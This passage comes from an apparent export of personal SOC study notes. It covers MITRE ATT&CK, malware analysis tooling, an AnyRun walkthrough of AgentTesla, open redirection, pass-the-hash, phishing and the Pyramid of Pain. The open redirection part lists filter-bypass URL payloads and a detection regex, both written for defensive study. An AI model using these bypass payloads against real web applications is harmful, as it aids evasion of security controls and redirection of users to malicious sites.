Sub-Techniques\n4. MITRE ATT&amp;CK Mitigations\n5. MIRE ATT&amp;CK Software\n6. APT Groups\nNext: Phishing"},"SOC/MITRE-ATT-and-CK-Matrix":{"title":"MITRE ATT&CK Matrix","links":["SOC/MITRE-ATT-and-CK-Framework"],"tags":[],"content":"What is ATT&amp;CK Matrix? 🤔\nMITRE ATT&amp;CK Matrix is a visualization method used to classify and see attack methods of cyber attackers. Matrices can be customized for almost any subject and turned into useful visuals. MITRE has created MITRE ATT&amp;CK matrices to visualize the details of attacker behavior using the matrices.\nTypes of Matrices 🌳\n3 different matrices have been created within the MITRE ATT&amp;CK Framework according to the platform types:\n\nEnterprise Matrix\nMobile Matrix\nICS (Industrial Control Systems) Matrix\n\n1. Enterprise Matrix 🏢\nEnterprise matrix is the first matrix created by MITRE. There are more digital systems included in this matrix and are more common than those that are included in other matrices, so there are a lot more information in this matrix than other matrices. Enterprise matrix is mainly used to understand the cyber attacks on large organizations.\nThe following image shows the enterprise matrix in detail:\n\nSub-matrices 🌿\nThere are 7 sub-matrices under the Enterprise Matrix:\n\nPRE\nWindows\nmacOS\nLinux\nCloud\nNetwork\nContainers\n\nYou can access the Enterprise Matrix and its sub-matrices at the following link and can learn more about them:\nEnterprise Matrix: attack.mitre.org/matrices/enterprise/ \n\n2. Mobile Matrix 📱\nThe mobile matrix is the one that was prepared for mobile devices and contains information about the cyber security of mobile devices. This matrix can be used to ensure the security of individual and corporate mobile devices. Comparing the Enterprise Matrix, it contains less information:\nThe following image shows the mobile matrix:\n\nMobile Matrix: attack.mitre.org/matrices/mobile/ \nSub-matrices 🌿\nMobile Matrix has 2 sub-matrices:\n\nAndroid\niOS\n\n\n3. ICS Matrix 🏭\nThe ICS Matrix is the one that contains the information collected for the cyber security of devices in the industrial control systems. This matrix can be used to provide cyber security and analyses of an ICS.\nThe following image shows the ICS matrix:\n\nICS Matrix: attack.mitre.org/matrices/ics/"},"SOC/MITRE-ATT-and-CK-Mitigations":{"title":"MITRE ATT&CK Mitigations","links":["MITRE-ATT-and-CK-matrix"],"tags":[],"content":"What are Mitigations?\nMitigations refers to the measures and actions that can be taken in response to the techniques in the MITRE ATT&amp;CK matrix. Each mitigation has a unique ID, name and description that provides clear understanding about them.\ne.g., the image below shows one of the enterprise mitigations:\n\nTypes of Mitigations\nMitigations are grouped into 3 for the matrices as in other MITRE ATT&amp;CK components:\n\nEnterprise Mitigations\nMobile Mitigations\nICS Mitigations\n\nEnterprise Mitigations\n\nThe number of enterprise mitigations: 43\nMobile Mitigations\n\nThe number of mobile mitigations: 11\nICS Mitigations\n\nThe number of ICS mitigations: 51"},"SOC/MITRE-ATT-and-CK-Tactics":{"title":"MITRE ATT&CK Tactics","links":["SOC/MITRE-ATT-and-CK-Framework","SOC/Reconnaissance","HTB/Privilege-Escalation"],"tags":[],"content":"What is Tactic?\nTactic expresses the purpose of the cyber attacker and the reason for his action. Tactics are one of the most important MITRE ATT&amp;CK Framework components used to group cyber attacker behaviors and see the attack steps. Tactics are in the top row of the matrix.\ne.g., the tactics on the enterprise matrix are shown in the image below:\n\nTypes of Tactics\nTactics often consist of general statements as they express the purpose and reason for the cyber attack. Therefore, the tactics for each matrix are highly similar.\nFor example, the image below shows detailed information about the “Initial Access” tactic belonging to the enterprise matrix:\n\nThe tactic numbers and names in each matrix are given in the titles below.\n1. Enterprise Tactics \nThere are 14 tactics in the Enterprise matrix as in the list below:\n\nReconnaissance\nResource Development\nInitial Access\nExecution\nPersistence\nPrivilege Escalation\nDefense Evasion\nCredential Access\nDiscovery\nLateral Movement\nCollection\nCommand and Control\nExfiltration\nImpact\n\nYou can access each tactic under the Enterprise matrix from the navigation menu on the left of the page at the link above.\n2. Mobile Tactics \nThere are 14 tactics in the Mobile matrix as in the list below:\n\nInitial Access\nExecution\nPersistence\nPrivilege Escalation\nDefense Evasion\nCredential Access\nDiscovery\nLateral Movement\nCollection\nCommand and Control\nExfiltration\nImpact\nNetwork Effects\nRemote Service Effects\n\n3. ICS Tactics\nThere are 12 tactics in the ICS matrix as in the list below:\n\nInitial Access\nExecution\nPersistence\nPrivilege Escalation\nEvasion\nDiscovery\nLateral Movement\nCollection\nCommand and Control\nInhibit Response Function\nImpair Process Control\nImpact\n"},"SOC/MITRE-ATT-and-CK-Technics--and--Sub-Techniques":{"title":"MITRE ATT&CK Technics & Sub-Techniques","links":["SOC/Reconnaissance"],"tags":[],"content":"What are Techniques and Sub-Techniques?\nThe tactics within the matrix only show what the attackers aim and do not contain detailed information about the attacker’s attack method. The techniques and sub-techniques, on the other hand show the methods used by the attacker to achieve his goal and how he conducted the attack exactly. As an example, some of the techniques on the enterprise matrix are shown in the image below:\n\nThe majority of the areas in the matrix in the image above is techniques. Some techniques have sub-techniques and some do not.\nAs it is shown in the image above, If there are gray areas next to the boxes where the names of the techniques are written in the matrix, it indicates that the technique has a sub-technique. For example, let’s see the sub-techniques of the first 4 techniques under the “Reconnaissance” tactic:\n\nTypes of Techniques and Sub-Techniques\nTechniques are divided into 3 groups according to matrices:\n\nEnterprise Techniques\nMobile Techniques\nICS Techniques\n\nEnterprise Techniques\nThere are quite a number of enterprise techniques and are constantly updated over the time. The current number (10.05.2023) of enterprise techniques and sub-techniques is as follows:\nTechniques: 193\nSub-techniques: 401\nMobile Techniques\nTotal number of mobile techniques is less than the enterprise techniques and they are updated over the time as well. The current number (10.05.2023) of the mobile techniques and sub-techniques is as follows:\nTechniques: 66\nSub-techniques: 41\nICS Techniques\nAs with the techniques of other matrices, ICS techniques are also updated over the  time. The current number (10.05.2023) of ICS techniques and sub-techniques is as follows:\nTechniques: 79\nSub-techniques: 0\nWhat is Procedure?\nThe procedure consists of usage examples of techniques/sub-techniques. It simply shows which tool/software was utilized during the implementation of the technique. In other words, it is the explanation of the practical information on the use of the technique.\nAn example of the procedure for the “OS Credential Dumping” technique is in the image below:\n\nProcedures can also be accessed through the page where the techniques are located."},"SOC/Malware-Analysis-Tools":{"title":"Malware Analysis Tools","links":[],"tags":[],"content":"Tools &amp; Software\nVirtualization Software\nWe do not want to conduct dynamic analysis on our own system as we need to run the malware to be able to examine its activities. For this reason, we should make use of Virtualization Software that helps us work on some virtual systems.\nThanks to these software, you can use a different operating system on your host operating system. If they are configured properly, you can perform your analysis safely, as malicious software cannot escape from this virtual operating system. It is useful to make a small note here on these virtualization software. Since these virtualization environments are essentially software, various vulnerabilities that allow malwares to escape out of these virtual environments and allow code executions on the host operating system may occur on these environments. For this reason, It is crucial to keep your virtualization software up-to-date.\nSome of the frequently used virtualization software are as follows;\n\nVMware Workstation\nVMware Fusion\nOracle Virtualbox\n\nAn ideal isolated dynamic analysis environment consists of a completely separate physical device and a separate network. However, setting up this complex environment is both very costly and it is not necessary to begin with.\nUtility Softwares\nAfter installing your own virtual operating system, you need to install software that will be useful in dynamic analysis. For example, we will not be able to perform dynamic analysis of office files with file extensions such as docx, xlsx without installing Microsoft Office or similar software on the system.\n\nMicrosoft Office\nAdobe Reader\nBrowser (Chrome, Firefox etc.)\nWinRAR\nText Editors (Notepad++, Sublime Text etc.)\n\nThe attackers are very familiar with the dynamic analysis method. Therefore they check whether frequently used software is installed or not on the target system to be able determine if the malware is running on a virtual operating system before performing malicious activities on the devices they compromised.\nDebuggers\nDebuggers are software that are generally used by programmers to test the codes and catch the errors. Debuggers help to see the instructions of a process and change the flow of the program\nMalware analysts frequently make use of debuggers to learn the working structure of the malware and disable some prevention mechanisms by making changes to the malware codes.\nFor instance, you want to analyze a malware that does not work when the device name is not “John”. With the help of the Debugger, you can disable this control by making changes to the codes in which this control is made, and ensure that the malware continues to run.\nSome debuggers that are frequently preferred by malware analysts are as follows.\n\nOllydbg\nX64dbg\nWindbg\nRadare2\n\nNetwork Monitoring Tools\nInformation such as the network connections established by the malware, the addresses it communicates with and how it communicates with those should be reported as a result of the malware analysis.\nWe need some software to detect the network activities of the malware. Some of them are as follows.\n\nWireshark\nFiddler\nBurp Suite\n\nProcess Monitoring Tools\nA new process is created for the program we run for malware analysis. In order to monitor these processes, we should use process monitoring tools.\nWindows already comes with a process monitoring tool called “Task Manager”. However, other process monitoring tools are more useful in terms of usage and features for malware analysis.\nYou can install the following process monitoring tools in the virtual operating system we will create for dynamic malware analysis.\n\nProcess Hacker\nProcess Explorer (SysInternals)\nProcmon (SysInternals)\n\nFile Activity Monitoring Tools\nFile activities are one of the first activities that should be followed in dynamic analysis. Malware can read files to collect information from the operating system, write other components of the malware to the file system, and move itself to the startup folder to ensure the persistence. Malware can be involved in various activities in the file system for these and other reasons. We should detect and indicate these activities in the malware analysis report.\nYou can use the following tools to see file activities.\n\nSysmon\n\nOther Tools\n\nSysInternal Tools\nCFF Explorer\nPEView\nTriDNet\nBinText\nPEiD\nRegshot\nHashMyFiles\n"},"SOC/Malware-Analysis-Using-Anyrun":{"title":"Malware Analysis Using Anyrun","links":[],"tags":[],"content":"Dynamic Analysis Using AnyRun\nYou can take advantage of sandbox services / products to quickly analyze malware.\nAnyRun is an interactive sandbox that you can use when you want to analyze malware quickly.\nAnyRun has options for paid or free use. If you want to take advantage of it for free, all your analysis is visible to others, therefore we do not recommend that you upload files that may contain personal data to AnyRun. In addition, the free plan has restrictions such as usage time.\nHow can we use AnyRun for our malware analysis, what kind of outputs we can get, let’s examine it together.\nLet’s download the malware with hash 80b51e872031a2befeb9a0a13e6fc480 to analyze via AbuseCH (Click here to download).\nWe have to click on the ”+” (New Task) button on the left menu to upload the malware we downloaded.\n\nLet’s upload the file we want to analyze on the screen that opens with the help of the “Choose a file” button. After the file is uploaded, we can determine the parameters such as which operating system we want to run the malware and 32/64 bit of operating system to use. After determining these, we open our sandbox with the help of the “Run” button at the bottom right of the screen that opens.\nWhen our machine is turned on, we run the malicious software we uploaded to see it’s activities.\nSome malware stays dormant for a certain period of time before performing its malicious activities, making analysis difficult. Let’s allow time for the malware to perform its activities, during this time, let’s examine the AnyRun interface together.\n\n\nFrom this area, you can use the operating system interactively.\nHere is a list of processes in this section. From here, you can easily see which childprocesses the malware you run has.\nIn this area there is network and files events.\nThis section contains details of the process.\n\nLet’s examine these outputs.\nFirst, let’s examine the process events of the malware in the section marked “2” in the image above.\n\nThe malware we run manually seems to have created 2 child processes. One of them is schtasks.exe, which is run to ensure persistence on the system by creating a schedule task and the other is the process specified as “AgentTesla” malware by AnyRun.\nWhen we click on Processes, information about this process is displayed in panel number 4. Let’s examine the details of all processes respectively.\nSince the process named “WinRAR.exe” is created when we extract the malware from the archive file to run it, we will not examine this process.\nWhen we click on the process with ID 2680, information about this process is listed on panel number 4.\n\nWith the “More Info” button on this panel, a page with detailed information about the process is opened. When we want to reach detailed information, we can use this section.\nWhen the process information with 2680 ID is examined, the malware:\n\nUses Task Scheduler,\nWrites a program to the file system which compile time is too old,\nWrites many files to the user directory\n\n\nWhen we examine the process with ID 2616, we see that it is schtasks.exe belonging to Task Scheduler.\nWhen we examine the “Command Line” parameters, we see that it creates a schedule task named “Updates\\neHneiobyhcrJJ”. The configurations for this schedule task are in the file “tmp5383.tmp”.\n\nWhen we examine the schedule task configuration file named tmp5383.tmp, we see that the program named “neHneiobyhcrJJ.exe” will run.\n\nWhen we examine the process with ID 3140:\n\nThis malware is recognized by AnyRun as AgentTesla,\nSteals credentials,\nCreating files in the user directory\n\n\nWhen we examine the network connections made from panel number 3, we see that malware connects to smtp.godforeu.com.\nWith the help of the button on the right of the panel, we can examine the incoming/outgoing data.\n\nWhen the network activities of the malware are examined, we find that malware exfiltrates data with the SMTP protocol.\nIf you want to examine, you can reach the analysis made here (Click here)."},"SOC/Malware-Analysis":{"title":"Malware Analysis","links":["SOC/Malware-Analysis-Using-Anyrun","SOC/29-Malware-analysis-adresses","SOC/Setting-up-Malware-Analysis-Lab","SOC/Dynamic-Analysis-Steps","SOC/Dynamic-Malware-Analysis-Example-1","SOC/Dynamic-Malware-Analysis-Example-2"],"tags":[],"content":"Analysis Method\nStatic Analysis\nIt is the approach of analyzing malicious software by reverse engineering methods without running them.\nGenerally, by decompile / disassemble the malware, each step that the malware will execute is analyzed, hence the behavior / capacity of the malware can be analyzed.\n\nYour device will not be infected as you do not run malicious software in static analysis. (However, we do not recommend performing static analysis on your host device, it will be more proper to do your analysis in a virtual operating system.)\nThe information examined during the static analysis is as follows.\n\nP.E. (Portable Executable) Headers\nImported DLL’s\nExported DLL’s\nStrings in binary\nCPU Instructions\n\nYou can obtain malware sample from blue team training platform LetsDefend\nDynamic Analysis\nIt is the approach that examines the behavior of malicious software on the system by running it. We can do it in our own lab or using Anyrun.\nMalware Analysis Using Anyrun\n29 Malware analysis adresses\nIn dynamic analysis, applications that can examine registry, file, network and process events are installed in the system, and their behavior is examined by running malicious software.\nWhile doing dynamic analysis, you should carefully examine the following events.\n\nNetwork Connections\nFile Events\nProcess Events\nRegistry Events\n\n\nMalware Analysis Lab\nWe can’t and shouldn’t run malware in our main system as it would infect it so we need a separate burner system to run and analyze malware. For this, we need a Malware Analysis Lab . Setting up a malware analysis lab is described in Setting up Malware Analysis Lab article.\nSteps for Dynamic Analysis\nExamples\n1.  Dynamic Malware Analysis Example 1\n2.  Dynamic Malware Analysis Example 2"},"SOC/Masquerading":{"title":"Masquerading","links":["SOC/Masquerading"],"tags":[],"content":"Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading."},"SOC/Network-Propagation":{"title":"Network Propagation","links":["SOC/C2","HTB/Privilege-Escalation"],"tags":[],"content":"After a device is exploited in a network, the adversary spreads its access through the network.\nExploiting more devices in the same network becomes a lot more easier because usually:\n\nCredentials to other devices may be insecurely stored on host\nHost might have exclusive access to other devices such as printers and storages, not open to public\n\nHence, the attacker would set up a base on one of the systems to act as their pivot point and use it to gather information about the internal network.\nNetwork Propagation Process\n\nPivoting\n(MITRE Tactic TA0008)\nOnce the attacker has access to the system, they would use it as their staging site and a tunnel between their C2 Server and the victim’s network. The system would also be used as the distribution point for all malware and backdoors at later stages.\nDiscovery\n(MITRE Tactic TA0007)\nThe adversary would uncover information about the system and the network it is connected to. Within this stage, the knowledge base would be built from the active user accounts, the permissions granted, applications and software in use, web browser activity, files, directories and network shares, and system configurations.\nPrivilege Escalation\n(MITRE Tactic TA0004)\nFollowing their knowledge-gathering, the adversary would try to gain more prominent permissions within the pivot system. They would leverage the information on the accounts present with vulnerabilities and misconfigurations found to elevate their access to one of the following superior levels:\n\nSYSTEM/ ROOT.\nLocal Administrator.\nA user account with Admin-like access.\nA user account with specific access or functions.\n\nExecution\n(MITRE Tactic TA0002)\nThis is where they deploy their malicious code using the pivot system as their host. Remote trojans, C2 scripts, malicious links and scheduled tasks are deployed and created to facilitate a recurring presence on the system and uphold their persistence.\nCredential Access\n(MITRE Tactic TA0006)\nWorking hand in hand with the Privilege Escalation stage, the adversary would attempt to steal account names and passwords through various methods, including keylogging and credential dumping. This makes them harder to detect during their attack as they would be using legitimate credentials.\nTools like Mimikatz can be used for credential dumping.\nLateral Movement\n(MITRE Tactic TA0008)\nWith the credentials and elevated privileges, the adversary would seek to move through the network and jump onto other targeted systems to achieve their primary objective. The stealthier the technique used, the better."},"SOC/OSINT":{"title":"OSINT","links":[],"tags":[],"content":"Open source intelligence (OSINT) is the act of gathering and analyzing publicly available data for intelligence purposes."},"SOC/OWASP":{"title":"OWASP","links":[],"tags":[],"content":"The Open Web Application Security Project (OWASP) is a non-profit foundation dedicated to improving software security.\nWithout a doubt, OWASP is one of the best resources for information on web application security.\nOWASP Top Ten\nEvery few years, OWASP publishes a list of the 10 web application vulnerabilities that pose the most critical security risks. The latest release was in 2021 at the time of writing.\n\nThe 2021 OWASP list contains these critical vulnerabilities:\n\nBroken Access Control\nCryptographic Failures\nInjection\nInsecure Design\nSecurity Misconfiguration\nVulnerable and Outdated Components\nIdentification and Authentication Failures\nSoftware and Data Integrity Failures\nSecurity Logging and Monitoring Failures\nServer-Side Request Forgery (SSRF)\n"},"SOC/Open-Redirection-Attack":{"title":"Open Redirection Attack","links":["phishing","SOC/OWASP"],"tags":[],"content":"What is Open Redirection?\nOpen redirection is a web security vulnerability that occurs when a website or web application redirects users to a different URL without proper validation or sanitization of the target URL. Attackers can exploit Open Redirection to trick users into visiting malicious websites or performing actions unintended by the website owner.\nIn an open redirection attack, an attacker typically crafts a legitimate URL hosted on the vulnerable website, but includes a malicious URL as a parameter or query string. When a user clicks on the crafted URL, the website’s redirect mechanism automatically redirects the user to the malicious URL, which can lead to various malicious activities, such as phishing attacks, spreading malware, or stealing sensitive information.\nOpen redirection vulnerabilities commonly occur when websites use user-supplied input, such as URLs, as part of their redirect mechanism without proper validation or sanitization. To prevent open redirection attacks, web developers should validate and sanitize all user-supplied input used in redirections, and ensure that only trusted and whitelisted URLs are allowed for redirection. Additionally, it’s important to implement proper authentication and authorization mechanisms to ensure that only authenticated and authorized users can perform redirects. Regular security testing, including vulnerability scanning and penetration testing, can also help identify and fix open redirection vulnerabilities in web applications.\nOpen Redirection Types / Possible Vectors\n1. URL-based open redirection\nThis is the most common type of open redirection vulnerability. It occurs when a website takes a URL or a URL parameter as input and uses it in a redirect without proper validation or sanitization. An attacker can craft a malicious URL that includes a different domain or malicious URL as a parameter which will be included in the redirect, leading to an unintended redirection to a malicious website.\n2. JavaScript-based open redirection\nThis type of open redirection vulnerability occurs when a website uses JavaScript to perform a redirect, but the target URL is obtained from untrusted or user-controlled sources without proper validation or sanitization. An attacker can manipulate the JavaScript code or input data to execute a malicious redirect to a different domain or URL.\n3. Meta refresh-based open redirection\nThis type of open redirection vulnerability occurs when a website uses the HTML “meta refresh” tag to redirect users to another URL automatically, and the target URL is obtained from untrusted or user-controlled sources without proper validation or sanitization. An attacker can manipulate the meta refresh tag or input data to trigger a malicious redirect to a different domain or URL.\n4. Header-based open redirection\nThis type of open redirection vulnerability occurs when a website uses HTTP headers, such as “Location” header, to perform a redirect, but the target URL is obtained from untrusted or user-controlled sources without proper validation or sanitization. An attacker can manipulate the header value or input data to trigger a malicious redirect to a different domain or URL.\n5. Parameter-based open redirection\nThis type of open redirection vulnerability occurs when a website uses a parameter in the URL or in a form submission as part of the redirect process, but fails to properly validate or sanitize the parameter value. An attacker can manipulate the parameter value to trigger a redirect to a malicious URL.\nIt’s important for web developers to be aware of these different types of open redirection vulnerabilities and implement proper validation and sanitization of user-supplied input to prevent such vulnerabilities in their web applications.\nHow Open Redirection Works?\nHere’s an example of a vulnerable code in a web application that demonstrates an open redirection vulnerability using PHP:\n\nIn this example, the web application takes a target URL as a query parameter (url) from the user and uses it in a redirect without validating or sanitizing the input. This can lead to an open redirection vulnerability, as an attacker can craft a malicious URL and pass it as the url parameter, leading to unintended redirection to a malicious website.\nFor example, an attacker could create a URL like this:\n\nWhen a user clicks on this URL, the vulnerable application will automatically redirect the user to malicious.com, which could be a phishing website or a site hosting malware.\nImpact of Open Redirection\nOpen redirection vulnerabilities can have a significant impact on the security of a web application and its users. Some of the potential impacts of open redirection vulnerabilities include:\n1. Phishing attacks:\nAttackers can craft malicious URLs that appear legitimate and trick users into clicking on them, leading to unintended redirection to a phishing website. Phishing attacks aim to steal sensitive information, such as usernames, passwords, and financial details, from unsuspecting users.\n2. Malware distribution:\nAttackers can redirect users to websites hosting malware, which can result in the automatic download and installation of malicious software on the user’s device. This can lead to malware infections, data breaches, and other types of cyber attacks.\n3. Social engineering attacks:\nAttackers can use open redirection vulnerabilities to conduct social engineering attacks, where they manipulate users into taking unintended actions, such as downloading malware, making fraudulent payments, or revealing sensitive information.\n4. Reputation damage:\nIf a website is found to have open redirection vulnerabilities, it can result in reputational damage for the website owner or organization. Users may lose trust in the website’s security and reliability, leading to loss of business, brand damage, and financial repercussions.\n5. Legal and regulatory consequences:\nOpen redirection vulnerabilities can result in legal and regulatory consequences, especially if sensitive user information is compromised. Organizations may face legal liabilities, fines, or other penalties for failing to protect user data and secure their web applications.\nPrevention Methods\nweb developers should follow secure coding practices and implement proper input validation and sanitization techniques. Here are some preventive measures that can be taken:\nValidate and sanitize input: Always validate and sanitize any user-supplied input that is used in the redirection process. This includes URL parameters, form submissions, and any other input that is used in generating redirect URLs. Validate that the input conforms to expected formats, such as valid URLs or whitelisted domains, and sanitize it to remove any malicious or unexpected characters.\nUse a whitelist approach: Instead of trying to blacklist or filter out specific characters or patterns from user input, it’s generally safer to use a whitelist approach where only known and trusted values are allowed. Define a whitelist of trusted domains or URLs to which the application is allowed to redirect, and validate that the user-supplied input matches the whitelist.\nAvoid using user-controlled data in redirects: Avoid using user-controlled data, such as input from URL parameters or form submissions, directly in the redirect process. If possible, use other means of redirection, such as using HTTP headers or server-side redirects that do not rely on user-controlled data.\nImplement proper authorization and authentication: Ensure that only authorized users are allowed to trigger redirects. Implement proper authentication and authorization mechanisms to verify the legitimacy of the user and their actions.\nImplement secure coding practices: Follow secure coding practices, such as using secure coding libraries or frameworks, keeping software up-to-date with the latest security patches, and conducting regular security reviews and vulnerability assessments.\nEducate users about potential risks: Educate users about the potential risks of clicking on suspicious or unexpected URLs, and encourage them to be cautious when clicking on links from unknown sources or providing personal information on websites.\nStay informed about web security best practices: Stay updated with the latest web security best practices and guidelines, such as the OWASP Top Ten Project, and incorporate them into your development processes.\nBy implementing these preventive measures and following secure coding practices, web developers can significantly reduce the risk of open redirection vulnerabilities in their web applications and protect their users from potential attacks. Regular security testing, including penetration testing and vulnerability assessments, can also help identify and mitigate any potential vulnerabilities in the application.\nHere’s an example of a vulnerable code in PHP that demonstrates an open redirection vulnerability, along with a fixed version:\n\nFixed Code:\n\nIn the fixed version, the **filter_var** function with **FILTER_VALIDATE_URL** filter is used to validate the user-supplied url parameter. This filter checks if the value is a valid URL according to the PHP filter extension, and if it returns true, the redirect is performed to the validated URL. If the url parameter does not pass the validation, a default URL or an error message can be shown, and no redirection is performed. This helps to prevent malicious URLs or invalid values from being used in the redirection process, mitigating the open redirection vulnerability.\nDetecting Open Redirect Attacks\nWhat was described in Part 1 was a list of things to do from the perspective of a hacker/attacker. At the same time, the issues that a developer should pay attention to while developing were also mentioned.\nSo in this part, let’s have a look at how to detect Open Redirection attacks with an example. But, before moving, let’s quickly recap some of the important things to detect Open Redirection attacks;\n\nIf there is a consecutive requests to query string parameters such as ?next (website.com/param.php), or ?url ( website.com/…?url=), with payloads like attacker.com or attacker.com (URL structure)\nFor the WAF or other middleware products, sometimes payloads can have bypass techniques like;\n\nLocalhost\n\nhttp://[::]:25/\nhttp://①②⑦.⓪.⓪.⓪\n\n\nCDIR\n\nhttp://127.0.0.0\n\n\nDecimal Bypass\n\nhttp://2130706433/ = http://127.0.0.1\n\n\nHexadecimal Bypass\n2. http://0x7f000001/ = http://127.0.0.1\n\n\nEncoded characters like %2f = /\n\nOf course it’s not possible to detect or analyze web server logs without using automated detection methods. For an easier way, any SOC analyst can use the following regex to detect open redirection attacks. \n/^.”GET.?.=(https%3a%2f%2f[a-z0-9-]+%2e[a-z]{2,}).+?.HTTP/.“.$/gm\nThis regex will match any log entry where the HTTP method is GET, the request contains a query parameter with x.com, and the request is using HTTP version 1.0 or 1.1. This should match the most common open redirection attack patterns.\nYou can customize this regex to match specific query parameters or HTTP methods that are relevant to your web application. Remember that this regex is just one part of an overall security monitoring strategy and should be used in conjunction with other security tools and best practices.\nDetection Example\nExample nginx access log file;\n\nAs you can see it on the above screenshot, open redirection attacks were made to the victim.com website on 18/Apr/2023:20:05:05. We have mentioned that attention should be to encoded characters. Here is where the importance of this issue is seen.\nEncoded:\n\nDecoded:\n\nWhen we decode the request, we see that the attacker wants to redirect to google.com with the ?pro parameter. When we realize that all requests occur within seconds, we understand that this is done with the help of a tool. At the same time, the source IPs are all the same."},"SOC/Pass-the-Hash-Attack":{"title":"Pass the Hash Attack","links":["SOC/Hash","HTB/Active-Directory"],"tags":[],"content":"A Pass-the-Hash (PtH) attack is a technique where an attacker captures a password Hash (as opposed to the password characters) and then passes it through for authentication and lateral access to other networked systems. With this technique, the threat actor doesn’t need to decrypt the Hash to obtain a plain text password. PtH attacks exploit the authentication protocol, as the passwords Hash remains static for every session until the password is rotated. Attackers commonly obtain hashes by scraping a system’s active memory and other techniques.\nWhile Pass-the-Hash attacks can occur on Linux, Unix, and other platforms, they are most prevalent on Windows systems. In Windows, PtH exploits Single Sign-On (SS0) through NT Lan Manager (NTLM), Kerberos, and other authentication protocols. When a password is created in Windows, it is hashed and stored in the Security Accounts Manager (SAM), Local Security Authority Subsystem (LSASS) process memory, the Credential Manager (CredMan) store, a ntds.dit database in Active Directory, or elsewhere. When a user logs onto a Windows workstation or server, they essentially leave behind their password credentials."},"SOC/Phishing":{"title":"Phishing","links":["IP-address","SOC/Email-Header-Analysis","SOC/Email-Header","SOC/Static-Email-Analysis","SOC/Dynamic-Email-Analysis","gateway","SOC/Web-Attacks"],"tags":[],"content":"Phishing is a form of social engineering and a scam where attackers deceive people into revealing sensitive information or installing malware such as viruses, worms, adware, or ransomware.\nInformation Gathering\nSpoofing\nBecause emails do not necessarily have an authentication mechanism, attackers can send emails in the name of someone else. Attackers can do this by using a technique called spoofing to make the user believe that the incoming email is reliable. Several protocols have been created to prevent the email spoofing technique. The SPF, DKIM, and DMARC protocols can be used to determine whether the sender’s address is fake or real. Some email programs check emails automatically. However, the use of these protocols is not mandatory and can cause problems in some cases.\n\nSender Policy Framework (SPF)\nDomainKeys Identified Mail (DKIM)\n\nTo manually determine if a mail is spoofed or not, the SMTP address of the mail should first be identified. The domain’s SPF, DKIM, DMARC, and MX records can be obtained using tools such as Mxtoolbox. Comparing this information will tell you if the email is spoofed or not.\n\nAs large institutions using their own mail servers will have their own IP addresses, you can check whether the SMTP address belongs to that institution or not by looking at the Whois records of the SMTP IP address.\nPhishing Email Analysis\n1. Email Header Analysis\nEmail Header can give us various insight on email origin and server details.\n2. Static Email Analysis\n3. Dynamic Email Analysis\n3. E-mail Traffic Analysis\nMany parameters are needed to analyze a phishing attack. The following parameters can give us an idea of the size of the attack and the target audience if we perform a search on the mail gateway.\n\nSender Address(info@letsdefend.io)\nSMTP IP Address(127.0.0.1)\n@letsdefend.io (domain base)\nletsdefend (In addition to the Gmail account, the attacker may have sent from the Hotmail account)\nSubject (sender address and SMTP address may be constantly changing)\n\nIn addition to the email numbers, it is necessary to know the recipients’ addresses and time information in the search results. If malicious emails are constantly being forwarded to the same users, their email addresses may have somehow been leaked and shared on sites such as PasteBin.\nAttackers can find email addresses using [[Reconnaissance#1. [theHarvester](https //github.com/laramies/theHarvester)|theHarvester]] tool on Kali Linux.\nNext: Web Attacks"},"SOC/Punycode":{"title":"Punycode","links":[],"tags":[],"content":"What is Punycode?\nAs per Wandera, “Punycode is a way of converting words that cannot be written in ASCII, into a Unicode ASCII encoding.”\nA Punycode attack used by the attackers to redirect users to a malicious domain that seems legitimate at first glance.\nFor example, adıdas.de is a domain name which has the Punycode of xn--addas-o4a.de/ which at first glance looks like a legitimate website.\nInternet Explorer, Google Chrome, Microsoft Edge, and Apple Safari are now pretty good at translating the obfuscated characters into the full Punycode domain name."},"SOC/Pyramid-of-Pain":{"title":"Pyramid of Pain","links":["SOC/Hash","Networking/IPV4-Address","Networking/IP-Address","firewall","SOC/Fast-Flux","Networking/DNS","SOC/Punycode","SOC/C2","Networking/URI,-URN-and-URL","SOC/Wireshark","SOC/Phishing","SOC/Backdoor","SOC/fuzzy-hashing","SOC/Pyramid-of-Pain","SOC/Pass-the-Hash-Attack","SOC/Cyber-Kill-Chain"],"tags":[],"content":"Pyramid of Pain is a conceptual model which organizes IOCs(Indicators Of Compromise) with the level of difficulty it will cause for an adversary to change the indicators associated with them, and their campaign.\nThe Pyramid of Pain\n1. Hash Values : Trivial\nHash values give insight into a specific malware sample, a malicious or a suspicious file, and as a way to uniquely identify and reference the malicious artifact. Various online tools such as VirusTotal and Metadefender Cloud - OPSWAT. can be used to perform hash lookups.\nBut modifying a file with even a single bit results in a different hash which can make it difficult to identify a malicious file using hash lookups.\n2. IP Address: Easy\nKnowing an IP Address of attacker can be beneficial since we can just put up a firewall rule to block the attacker. But this is not very effective as it can be easily evaded using tools like Fast Flux\n3. Domain Names: Simple\nDomain Names can be a pain for attacker as they would be needed to purchase, register and modify DNS Records. But attackers can use Punycode and redirection services to trick victim into visiting malicious sites.\nFun Trick: A + symbol when appended after a shortened link can enable us to see where a link is set up to redirect.\ne.g. When we visit tinyurl.com/xasdepobu+, we see:\n\n4. Host Artifacts: Annoying\nHost artifacts are the traces or observables that attackers leave on the system, such as registry values, suspicious process execution, attack patterns or IOCs (Indicators of Compromise), files dropped by malicious applications, or anything exclusive to the current threat.\nDetection of host artifacts is annoying because the attacker will have to circle back and change his attacking tools and methodologies.\n5. Network Artifacts: Annoying\nA network artifact can be a user-agent string, C2 information, or URI patterns followed by the HTTP POST requests. An attacker might use a User-Agent string that hasn’t been observed in your environment before or seems out of the ordinary.\nNetwork artifacts can be detected in Wireshark PCAPs (file that contains the packet data of a network) by using a network protocol analyzer such as TShark or exploring IDS (Intrusion Detection System) logging from a source such as Snort.\ne.g., We can use TShark to filter out the User-Agent strings by using the following command: tshark --Y http.request -T fields -e http.host -e http.user_agent -r analysis_file.pcap\n6. Tools: Challenging\nAt this stage, attacker will have to create new tools which means investing more time and money that is also if the adversary is actually capable of developing new malware.\nAttacker often use spear Phishing using malicious macro documents (maldocs) and attempt to create a Backdoor that can be used to establish C2, any custom .EXE, and .DLL files, payloads, or password crackers.\nWe can use fuzzy hashing to detect any malicious file with trivial changes made with intention of bypassing Hash value detection.\n7. TTPs: Tough\nThis is the pinnacle of Pyramid of Pain.\nTTPs stands for Tactics, Techniques &amp; 